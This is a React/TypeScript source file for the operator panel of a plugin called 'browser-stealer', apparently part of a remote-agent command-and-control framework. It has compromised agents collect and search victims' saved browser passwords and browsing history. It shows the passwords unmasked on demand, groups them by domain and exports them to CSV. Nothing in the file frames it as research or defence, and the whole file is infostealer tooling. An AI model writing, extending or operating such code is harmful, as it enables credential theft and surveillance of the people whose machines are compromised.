'use client';

import { useEffect, useMemo, useRef, useState } from 'react';
import { Accordion, Button, Chip, Dropdown, Input, Label, Skeleton, Tabs, Table, TextField } from '@heroui/react';
import { ArrowDownToLine, ArrowRotateLeft, ChevronDown, Eye, EyeSlash, Globe, Magnifier } from '@gravity-ui/icons';
import { usePluginHost } from '../../hooks/usePluginHost';

const PLUGIN_ID = 'com.libra.browser-stealer';
const PAGE_SIZE = 250;

type BrowserDataType = 'passwords' | 'history';

interface BrowserPassword {
  browser: string;
  profile: string;
  url: string;
  username: string;
  password: string;
  version?: string;
}

interface BrowserHistory {
  browser: string;
  profile: string;
  url: string;
  title: string;
  visits: number;
  lastVisit: number;
}

interface BrowserPagedResult<T> {
  total: number;
  offset: number;
  limit: number;
  items: T[];
  errors?: string[];
}

function parseResult<T>(raw: unknown): T | null {
  if (raw && typeof raw === 'object' && !Array.isArray(raw)) return raw as T;
  if (typeof raw === 'string') {
    try {
      const p: unknown = JSON.parse(raw);
      if (p && typeof p === 'object' && !Array.isArray(p)) return p as T;
    } catch {  }
  }
  return null;
}

function usePagedData<T>(type: BrowserDataType) {
  const { selectedAgent, dispatchTask } = usePluginHost();
  const [items, setItems] = useState<T[]>([]);
  const [total, setTotal] = useState(0);
  const [loading, setLoading] = useState(false);
  const [initialLoading, setInitialLoading] = useState(true);
  const [errors, setErrors] = useState<string[]>([]);
  const offsetRef = useRef(0);
  const hasMoreRef = useRef(true);

  const fetchPage = async (reset = false) => {
    if (!selectedAgent) return;
    if (loading) return;
    const offset = reset ? 0 : offsetRef.current;
    if (!reset && !hasMoreRef.current) return;
    setLoading(true);
    try {
      const res = await dispatchTask(PLUGIN_ID, 'collect', { type, offset, limit: PAGE_SIZE });
      const parsed = parseResult<BrowserPagedResult<T>>(res.result);
      const page = parsed ?? { total: 0, offset, limit: PAGE_SIZE, items: [] as T[] };
      setTotal(page.total);
      if (page.errors?.length) setErrors(prev => [...prev, ...page.errors!]);
      const newItems = page.items ?? [];
      if (reset) {
        setItems(newItems);
        offsetRef.current = newItems.length;
      } else {
        setItems(prev => [...prev, ...newItems]);
        offsetRef.current = offset + newItems.length;
      }
      hasMoreRef.current = offsetRef.current < page.total;
    } catch {
      setErrors(prev => [...prev, `Failed to fetch ${type}`]);
    } finally {
      setLoading(false);
      setInitialLoading(false);
    }
  };

  const reset = () => {
    setItems([]);
    setTotal(0);
    setErrors([]);
    offsetRef.current = 0;
    hasMoreRef.current = true;
    setInitialLoading(true);
  };

  return { items, total, loading, initialLoading, errors, hasMore: hasMoreRef, fetchPage, reset, selectedAgent, dispatchTask };
}

function ScrollLoader({ loading, hasMore, onLoadMore }: { loading: boolean; hasMore: boolean; onLoadMore: () => void }) {
  const sentinelRef = useRef<HTMLDivElement>(null);
  useEffect(() => {
    if (!hasMore || loading) return;
    const el = sentinelRef.current;
    if (!el) return;
    const obs = new IntersectionObserver(entries => {
      if (entries[0]?.isIntersecting) onLoadMore();
    }, { rootMargin: '200px' });
    obs.observe(el);
    return () => obs.disconnect();
  }, [hasMore, loading, onLoadMore]);
  return <div ref={sentinelRef} className="h-4">{loading && <Skeleton className="h-8 rounded-xl mt-2" />}</div>;
}

// CSV export helper
function downloadCsv(filename: string, headers: string[], rows: (string | number)[][]) {
  const csvContent = [
    headers.join(','),
    ...rows.map(row => row.map(cell => {
      const s = String(cell ?? '');
      return s.includes(',') || s.includes('"') || s.includes('\n')
        ? `"${s.replace(/"/g, '""')}"` : s;
    }).join(','))
  ].join('\n');

  const BOM = '\uFEFF';
  const blob = new Blob([BOM + csvContent], { type: 'text/csv;charset=utf-8;' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  a.remove();
  URL.revokeObjectURL(url);
}

export default function BrowserStealerPage() {
  const [subTab, setSubTab] = useState<string>('passwords');
  const [showAllPasswords, setShowAllPasswords] = useState(false);

  // Search state
  const [searchKeyword, setSearchKeyword] = useState('');
  const [searchLoading, setSearchLoading] = useState(false);
  const [searchResults, setSearchResults] = useState<BrowserPassword[] | BrowserHistory[] | null>(null);
  const [searchTotal, setSearchTotal] = useState(0);
  const [searchError, setSearchError] = useState<string | null>(null);

  const pw = usePagedData<BrowserPassword>('passwords');
  const hs = usePagedData<BrowserHistory>('history');

  const filteredPasswords = useMemo(() => {
    const source = searchResults && subTab === 'passwords'
      ? (searchResults as BrowserPassword[])
      : pw.items;
    return source.filter(p => p.url || p.username || p.password);
  }, [pw.items, searchResults, subTab]);

  const filteredHistory = useMemo(() => {
    if (searchResults && subTab === 'history') return searchResults as BrowserHistory[];
    return hs.items;
  }, [hs.items, searchResults, subTab]);

  useEffect(() => { pw.fetchPage(true); }, [pw.selectedAgent]);

  const handleTabChange = (key: string) => {
    setSubTab(key);
    setSearchResults(null);
    setSearchKeyword('');
    setSearchError(null);
    const store = key === 'passwords' ? pw : hs;
    if (store.initialLoading && store.items.length === 0) store.fetchPage(true);
  };

  const handleRefresh = () => {
    setSearchResults(null);
    setSearchKeyword('');
    setSearchError(null);
    const store = subTab === 'passwords' ? pw : hs;
    store.reset();
    setTimeout(() => store.fetchPage(true), 0);
  };

  const handleSearch = async () => {
    const keyword = searchKeyword.trim();
    if (!keyword || !pw.selectedAgent) return;
    setSearchLoading(true);
    setSearchError(null);
    setSearchResults(null);
    try {
      const dataType: BrowserDataType = subTab === 'passwords' ? 'passwords' : 'history';
      const res = await pw.dispatchTask(PLUGIN_ID, 'search', { type: dataType, keyword });
      const parsed = parseResult<{ total: number; items: BrowserPassword[] | BrowserHistory[] }>(res.result);
      setSearchResults(parsed?.items ?? []);
      setSearchTotal(parsed?.total ?? 0);
    } catch (err: unknown) {
      setSearchError(err instanceof Error ? err.message : String(err));
    } finally {
      setSearchLoading(false);
    }
  };

  const handleExport = (exportAll: boolean) => {
    if (subTab === 'passwords') {
      const data = exportAll ? pw.items : filteredPasswords;
      downloadCsv(
        `browser_passwords${searchKeyword ? '_search' : ''}.csv`,
        ['Browser', 'URL', 'Username', 'Password', 'Version'],
        data.map(p => [p.browser, p.url, p.username, p.password, p.version ?? ''])
      );
    } else {
      const data = exportAll ? hs.items : filteredHistory;
      downloadCsv(
        `browser_history${searchKeyword ? '_search' : ''}.csv`,
        ['Browser', 'URL', 'Title', 'Visits'],
        data.map(h => [h.browser, h.url, h.title, h.visits])
      );
    }
  };

  const passwordsByDomain = useMemo(() => {
    const map = new Map<string, (BrowserPassword & { key: string })[]>();
    for (let i = 0; i < filteredPasswords.length; i++) {
      const p = filteredPasswords[i]!;
      let domain: string;
      try { domain = new URL(p.url).hostname; } catch { domain = p.url || '(other)'; }
      if (!map.has(domain)) map.set(domain, []);
      map.get(domain)!.push({ ...p, key: `${i}` });
    }
    return [...map.entries()].sort((a, b) => b[1].length - a[1].length);
  }, [filteredPasswords]);

  const historyByHost = useMemo(() => {
    const source = searchResults && subTab === 'history'
      ? (searchResults as BrowserHistory[])
      : hs.items;
    const map = new Map<string, (BrowserHistory & { key: string })[]>();
    for (let i = 0; i < source.length; i++) {
      const h = source[i]!;
      let host: string;
      try { host = new URL(h.url).hostname; } catch { host = '(other)'; }
      if (!map.has(host)) map.set(host, []);
      map.get(host)!.push({ ...h, key: `${i}` });
    }
    return [...map.entries()].sort((a, b) => b[1].length - a[1].length);
  }, [hs.items, searchResults, subTab]);

  const currentErrors = subTab === 'passwords' ? pw.errors : hs.errors;
  const isSearching = searchResults !== null;
  const currentTotal = isSearching ? searchTotal : (subTab === 'passwords' ? pw.total : hs.total);

  if (pw.initialLoading && subTab === 'passwords') {
    return (
      <div className="space-y-3">
        <Skeleton className="h-16 rounded-xl" />
        <Skeleton className="h-16 rounded-xl" />
        <Skeleton className="h-16 rounded-xl" />
      </div>
    );
  }

  return (
    <div className="space-y-3">
      {/* Toolbar */}
      <div className="flex items-center justify-between">
        <div className="flex gap-2">
          <Chip variant="soft" color="accent">密码: {pw.total}</Chip>
          <Chip variant="soft" color="default">历史记录: {hs.total}</Chip>
        </div>
        <div className="flex gap-2 items-center">
          <Button size="sm" variant="ghost" onPress={() => setShowAllPasswords(v => !v)}>
            {showAllPasswords ? <EyeSlash className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
          </Button>
          <Button size="sm" variant="ghost" onPress={handleRefresh}>
            <ArrowRotateLeft className="w-4 h-4" />
          </Button>
          <Dropdown>
            <Dropdown.Trigger>
              <Button size="sm" variant="ghost" isIconOnly>
                <ArrowDownToLine className="w-4 h-4" />
              </Button>
            </Dropdown.Trigger>
            <Dropdown.Popover>
              <Dropdown.Menu onAction={(key) => {
                if (key === 'exportAll') handleExport(true);
                else if (key === 'exportSearch') handleExport(false);
              }}>
                <Dropdown.Item id="exportAll" textValue="导出全部">
                  <Label>导出全部 ({currentTotal})</Label>
                </Dropdown.Item>
                {isSearching && (
                  <Dropdown.Item id="exportSearch" textValue="导出搜索结果">
                    <Label>导出搜索结果 ({searchTotal})</Label>
                  </Dropdown.Item>
                )}
              </Dropdown.Menu>
            </Dropdown.Popover>
          </Dropdown>
        </div>
      </div>

      {/* Search bar */}
      <div className="flex gap-2 items-center">
        <TextField variant="secondary" value={searchKeyword} onChange={setSearchKeyword} className="flex-1">
          <Input variant="secondary"
            placeholder="搜索 url、用户名、密码..."
            onKeyDown={(e) => { if (e.key === 'Enter') handleSearch(); }}
          />
        </TextField>
        <Button size="sm" variant="primary" isDisabled={searchLoading || !searchKeyword.trim()} onPress={handleSearch}>
          {searchLoading ? (
            <span className="inline-block w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
          ) : (
            <Magnifier className="w-4 h-4" />
          )}
        </Button>
        {isSearching && (
          <Button size="sm" variant="ghost" onPress={() => { setSearchResults(null); setSearchKeyword(''); setSearchError(null); }}>
            清除
          </Button>
        )}
      </div>

      {searchError && (
        <div className="text-danger-500 text-sm">{searchError}</div>
      )}
      {isSearching && !searchLoading && (
        <div className="text-sm text-default-500">
          搜索 "{searchKeyword}" 找到 {searchTotal} 条结果
        </div>
      )}

      {currentErrors.length > 0 && (
        <div className="text-danger-500 text-sm">{currentErrors.join('; ')}</div>
      )}

      <Tabs selectedKey={subTab} onSelectionChange={(key) => handleTabChange(String(key))}>
        <Tabs.ListContainer>
          <Tabs.List aria-label="Browser data">
            <Tabs.Tab id="passwords">密码<Tabs.Indicator /></Tabs.Tab>
            <Tabs.Tab id="history">历史记录<Tabs.Indicator /></Tabs.Tab>
          </Tabs.List>
        </Tabs.ListContainer>
        <Tabs.Panel id="passwords">
          {filteredPasswords.length === 0 && !pw.loading ? (
            <div className="text-center text-neutral-500 py-8">暂无数据。</div>
          ) : (
            <div className="overflow-y-auto">
              <Accordion className="w-full">
                {passwordsByDomain.map(([domain, items]) => (
                  <Accordion.Item key={domain}>
                    <Accordion.Heading>
                      <Accordion.Trigger>
                        <span className="mr-3 size-4 shrink-0 text-muted"><Globe /></span>
                        <span className="flex-1 text-left">{domain}</span>
                        <Chip size="sm" variant="soft" className="mr-2">{items.length}</Chip>
                        <Accordion.Indicator><ChevronDown /></Accordion.Indicator>
                      </Accordion.Trigger>
                    </Accordion.Heading>
                    <Accordion.Panel>
                      <Accordion.Body>
                        <Table>
                          <Table.ScrollContainer>
                            <Table.Content aria-label="浏览器密码" className="min-w-[640px]">
                              <Table.Header>
                                <Table.Column isRowHeader>来源</Table.Column>
                                <Table.Column>URL</Table.Column>
                                <Table.Column>用户名</Table.Column>
                                <Table.Column>密码</Table.Column>
                              </Table.Header>
                              <Table.Body>
                                {items.map((p) => (
                                  <Table.Row key={p.key} id={p.key}>
                                    <Table.Cell><Chip size="sm" variant="soft">{p.browser}</Chip></Table.Cell>
                                    <Table.Cell className="max-w-[300px] truncate font-mono text-xs">
                                      <span title={p.url}>{p.url}</span>
                                    </Table.Cell>
                                    <Table.Cell>{p.username}</Table.Cell>
                                    <Table.Cell className="font-mono">{showAllPasswords ? p.password : '••••••••'}</Table.Cell>
                                  </Table.Row>
                                ))}
                              </Table.Body>
                            </Table.Content>
                          </Table.ScrollContainer>
                        </Table>
                      </Accordion.Body>
                    </Accordion.Panel>
                  </Accordion.Item>
                ))}
              </Accordion>
              {!isSearching && <ScrollLoader loading={pw.loading} hasMore={pw.hasMore.current} onLoadMore={() => pw.fetchPage()} />}
            </div>
          )}
        </Tabs.Panel>

        <Tabs.Panel id="history">
          {filteredHistory.length === 0 && !hs.loading ? (
            <div className="text-center text-neutral-500 py-8">暂无数据。</div>
          ) : (
            <div className="overflow-y-auto">
              <Accordion className="w-full">
                {historyByHost.map(([host, items]) => (
                  <Accordion.Item key={host}>
                    <Accordion.Heading>
                      <Accordion.Trigger>
                        <span className="mr-3 size-4 shrink-0 text-muted"><Globe /></span>
                        <span className="flex-1 text-left">{host}</span>
                        <Chip size="sm" variant="soft" className="mr-2">{items.length}</Chip>
                        <Accordion.Indicator><ChevronDown /></Accordion.Indicator>
                      </Accordion.Trigger>
                    </Accordion.Heading>
                    <Accordion.Panel>
                      <Accordion.Body>
                        <Table>
                          <Table.ScrollContainer>
                            <Table.Content aria-label="浏览器历史记录" className="min-w-[640px]">
                              <Table.Header>
                                <Table.Column isRowHeader>标题</Table.Column>
                                <Table.Column>URL</Table.Column>
                                <Table.Column>访问次数</Table.Column>
                                <Table.Column>来源</Table.Column>
                              </Table.Header>
                              <Table.Body>
                                {items.map((h) => (
                                  <Table.Row key={h.key} id={h.key}>
                                    <Table.Cell className="max-w-[250px] truncate">
                                      <span title={h.title}>{h.title || '-'}</span>
                                    </Table.Cell>
                                    <Table.Cell className="max-w-[300px] truncate font-mono text-xs">
                                      <span title={h.url}>{h.url}</span>
                                    </Table.Cell>
                                    <Table.Cell>{h.visits}</Table.Cell>
                                    <Table.Cell><Chip size="sm" variant="soft">{h.browser}</Chip></Table.Cell>
                                  </Table.Row>
                                ))}
                              </Table.Body>
                            </Table.Content>
                          </Table.ScrollContainer>
                        </Table>
                      </Accordion.Body>
                    </Accordion.Panel>
                  </Accordion.Item>
                ))}
              </Accordion>
              {!isSearching && <ScrollLoader loading={hs.loading} hasMore={hs.hasMore.current} onLoadMore={() => hs.fetchPage()} />}
            </div>
          )}
        </Tabs.Panel>
      </Tabs>
    </div>
  );
}
